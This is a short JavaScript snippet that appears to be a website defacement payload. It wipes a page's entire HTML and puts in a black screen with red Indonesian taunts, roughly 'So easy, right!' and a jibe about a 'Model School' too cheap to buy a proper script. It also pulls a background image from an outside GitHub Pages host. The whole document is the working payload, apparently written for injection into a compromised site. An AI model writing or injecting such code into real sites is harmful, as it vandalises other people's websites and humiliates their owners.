// Step 1: Remove all HTML
document.documentElement.innerHTML = "";

// Step 2: Add new HTML content
document.documentElement.innerHTML = `
  <head>
    <title>AwokAwokAwok</title>
    <style>
      body {
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: black; /* Black background color */
        background-image: url('https://dfbro.github.io/p.png');
        background-size: contain;
        background-position: center;
        background-repeat: no-repeat;
        color: red;
        font-family: Arial, sans-serif;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div>
      <h1>EZ Banget Ya!</h1>
      <p>Minimal beli script. Sekolah Model tapi gak MODAL.</p>
    </div>
  </body>
`;
